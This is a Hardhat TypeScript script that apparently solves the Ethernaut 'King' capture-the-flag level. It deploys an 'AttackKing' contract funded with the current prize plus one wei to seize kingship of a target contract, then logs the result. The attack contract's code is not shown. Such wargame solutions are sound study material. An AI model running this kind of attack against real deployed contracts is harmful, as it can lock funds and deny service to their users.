import {ethers} from "hardhat"
import dotenv from 'dotenv'

dotenv.config()

async function main() {
    const instanceAddress = process.env.TARGET_ADDRESS_10!
    const target = await ethers.getContractAt('King', instanceAddress)
    const prize = await target.prize()
    console.log(`current prize: ${prize}`)
    console.log(`current king: ${await target._king()}`)
    const attack = await ethers.deployContract('AttackKing', [instanceAddress], {value: prize + 1n})
    console.log(`attacker address: ${attack.target}`)
    console.log(`current king: ${await target._king()}`)
    console.log(`current prize: ${await target.prize()}`)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
